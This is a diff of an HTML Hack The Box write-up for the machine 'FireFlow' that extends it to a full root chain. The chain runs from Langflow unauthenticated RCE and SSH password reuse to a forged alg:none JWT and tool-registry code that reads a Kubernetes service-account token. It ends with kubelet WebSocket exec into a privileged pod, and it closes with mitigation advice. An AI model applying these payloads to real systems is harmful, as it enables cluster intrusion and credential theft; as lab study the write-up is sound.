@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>FireFlow — El Niño</title>
-<meta name="description" content="Hack The Box: FireFlow. Langflow RCE to SSH user nightfall pivot, and MCP API token forging.">
+<meta name="description" content="Hack The Box: FireFlow. Langflow RCE to SSH user nightfall, then MCP JWT forgery and kubelet WebSocket exec through privileged node-exporter for root.">
 <style>
   :root{
     --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
@@ -93,15 +93,15 @@
   <header class="hero">
     <div class="eyebrow">Hack The Box · machine</div>
     <h1><span data-morph="hero">FireFlow</span></h1>
-    <p class="lede">A workflow builder exposed to unauthenticated remote code execution drops you into a user shell; a JWT validation bypass grants Kubernetes node access.</p>
+    <p class="lede">A workflow builder exposed to unauthenticated remote code execution drops credentials for SSH; a JWT validation bypass in an internal MCP registry turns a service account token into kubelet exec against a privileged pod.</p>
     <div class="byline"><span>by <b style="color:var(--ink)">ssephi</b></span><span>· 05·07·2026</span>
-      <span>· ~15 min</span><span class="owned" style="color:var(--muted); border-color:var(--line)">● user owned</span></div>
+      <span>· ~18 min</span><span class="owned">● owned</span></div>
 
     <div class="fp">
       <div class="r">
         <div><p class="name" style="margin:0"><span data-morph="title">FireFlow</span></p>
           <div class="chips" style="margin-top:8px">Linux · <b>Medium</b> · K3s Cluster Node</div></div>
-        <div class="rate"><div class="big">🚩</div><div class="chips">user owned</div></div>
+        <div class="rate"><div class="big">✓</div><div class="chips">owned</div></div>
       </div>
       <div class="grid">
         <span><b>target</b> &nbsp;10.129.244.214 &nbsp;· &nbsp;fireflow.htb</span>
@@ -113,16 +113,18 @@
 
   <section>
     <h2>The shape of it</h2>
-    <p>FireFlow represents a realistic modern cloud-native configuration bypass. The target hosts a Langflow portal which is vulnerable to an unauthenticated Remote Code Execution flaw (CVE-2026-33017). This RCE yields local credentials and enables an SSH pivot to capture <code>user.txt</code>. Further escalation via an unauthenticated MCP server exposes a JWT validation flaw (alg: none), granting access to a service account token with Kubelet proxy read privileges.</p>
+    <p>FireFlow represents a realistic modern cloud-native configuration failure. The target hosts a Langflow portal vulnerable to unauthenticated remote code execution in the public temporary flow builder. That foothold yields local credentials and enables an SSH pivot to <code>nightfall</code>. Root comes from an internal MCP registry that accepts unsigned JWTs, lets an attacker register Python tools, and runs inside Kubernetes with a service account token that can talk to kubelet.</p>
     <div class="chain"><b>nmap</b> 2 ports → 22/443
   └─ :443 → flow.fireflow.htb → <b>Langflow 1.8.2</b>
        └─ <b>CVE-2026-33017</b> unauth RCE via build_public_tmp
             └─ RCE as www-data → read /etc/langflow/.env
                  └─ password reuse → nightfall ssh → <b>user.txt</b>
                       └─ MCP Tool Registry (port 30080)
-                           └─ <b>alg: none JWT bypass</b> → forge token
-                                └─ read mcp-sa serviceaccount token
-                                     └─ get nodes/proxy → read host logs</div>
+                           └─ <b>alg:none JWT bypass</b> → role=admin
+                                └─ register top-level Python tool in MCP pod
+                                     └─ read mcp-sa token → kubelet /pods
+                                          └─ privileged node-exporter mounts / at /host/root
+                                               └─ kubelet WebSocket exec → <b>root.txt</b></div>
   </section>
 
   <section>
@@ -157,30 +159,59 @@ class TextOperations(Component):
 
   <section>
     <div class="eyebrow">03 · user pivot</div>
-    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">SSH Pivot & user.txt</span></h2></div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">SSH Pivot &amp; user.txt</span></h2></div>
     <p>The command output reveals the environment variables, yielding the administrative password: <code>n1ghtm4r3_b4_n1ghtf4ll</code>. Due to password reuse, we pivot to SSH using this password for the user <code>nightfall</code> to collect the user flag.</p>
     <pre><code>sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.244.214
 cat /home/nightfall/user.txt
-# Flag: 5b7e2496a630f2bc2b795a27ca813757</code></pre>
+# Flag: 03fefa09a3a9602eb37b015b43107f58</code></pre>
   </section>
 
   <section>
     <div class="eyebrow">04 · lateral movement</div>
-    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">MCP JWT Bypass & Kubelet Proxy</span></h2></div>
-    <p>In <code>/home/nightfall/.mcp/config.json</code>, we find configuration settings for the MCP server running on port 30080. The registry is vulnerable to a JWT signature bypass via the <code>none</code> algorithm. We forge a token for the <code>langflow-bot</code> service account, which allows us to request the <code>mcp-sa</code> service account token. This token holds <code>nodes/proxy</code> permissions on the K3s API, granting log directory reads on the host.</p>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">MCP JWT Bypass &amp; Kubelet Proxy</span></h2></div>
+    <p>In <code>/home/nightfall/.mcp/config.json</code>, we find configuration settings for the MCP server running on port 30080. The service advertises JWT authentication and even lists <code>none</code> as a supported algorithm. A normal login as <code>langflow-bot</code> returns <code>role=user</code>; forging the same subject with <code>role=admin</code> lets us register custom tools.</p>
     <pre><code># Forge alg: none token
 Header: {"alg": "none", "typ": "JWT"}
-Payload: {"iss": "kubernetes/serviceaccount", "sub": "system:serviceaccount:default:mcp-sa"}
+Payload: {"sub": "langflow-bot", "role": "admin"}
 
-# Query Kubelet proxy logs
-curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
-  "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/syslog" | head -n 30</code></pre>
+# Register a Python tool. The server executes submitted code at top level.
+POST /api/v1/tools
+{"name":"pod_context","code":"print(open('/var/run/secrets/kubernetes.io/serviceaccount/token').read())"}</code></pre>
     <figure>
       <img src="../assets/terminal_privesc.png" alt="Forging JWT and Querying Kubelet Proxy">
-      <figcaption>Forging an 'alg: none' JWT and exploiting proxy access to read host syslog.</figcaption>
+      <figcaption>Forging an 'alg: none' JWT and using the MCP tool registry as a Python execution bridge.</figcaption>
     </figure>
+    <p>The custom tool runs inside the MCP pod as <code>uid=1000(mcp)</code>. From there, the mounted token belongs to <code>system:serviceaccount:default:mcp-sa</code>. The token cannot list nodes directly, but it can read kubelet through <code>nodes/proxy</code>, and direct kubelet on <code>10.129.244.214:10250</code> is reachable from the pod.</p>
+    <pre><code>GET https://10.129.244.214:10250/pods
+
+POD monitoring prometheus-prometheus-node-exporter-nmntq
+  hostNetwork: true
+  hostPID: true
+  container: node-exporter
+  privileged: true
+  runAsUser: 0
+  hostPath /     → /host/root (readOnly)
+  hostPath /proc → /host/proc
+  hostPath /sys  → /host/sys</code></pre>
+  </section>
+
+  <section>
+    <div class="eyebrow">05 · root</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">Kubelet Exec to Host Root</span></h2></div>
+    <p>The direct kubelet API accepts a WebSocket <code>GET</code> to <code>/exec</code> with the <code>v4.channel.k8s.io</code> subprotocol. Because <code>node-exporter</code> is privileged and runs as root with the host filesystem mounted at <code>/host/root</code>, executing <code>/bin/sh -c 'cat /host/root/root/root.txt'</code> inside that container reads the host flag.</p>
+    <pre><code>wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
+  ?output=1&amp;error=1&amp;tty=0
+  &amp;command=/bin/sh&amp;command=-c
+  &amp;command=id; ls -l /host/root/root/root.txt; cat /host/root/root/root.txt
+
+Authorization: Bearer &lt;mcp-sa-token&gt;
+Sec-WebSocket-Protocol: v4.channel.k8s.io</code></pre>
+    <pre><code><span class="g">uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)</span>
+-rw-r-----    1 root     root            33 Jul 23 16:04 /host/root/root/root.txt
+<span class="c">a39fe631072379a440c5afbdc586865a</span>
+{"status":"Success"}</code></pre>
     <div class="callout"><span class="k">Closing FireFlow</span>
-      <p>Upgrade Langflow to version 1.8.3 or above. Fix JWT authentication by strictly validating JWT algorithms (forbidding "none"). Limit service account privileges on the Kubelet proxy node endpoints.</p>
+      <p>Upgrade Langflow beyond the vulnerable 1.8.2 build and disable unauthenticated public-flow execution. Fix the MCP registry to reject unsigned JWTs, do not execute stored tool code without strong authorization, remove unnecessary service account token mounts, and avoid granting broad kubelet <code>nodes/proxy</code> access to application pods.</p>
     </div>
   </section>
 
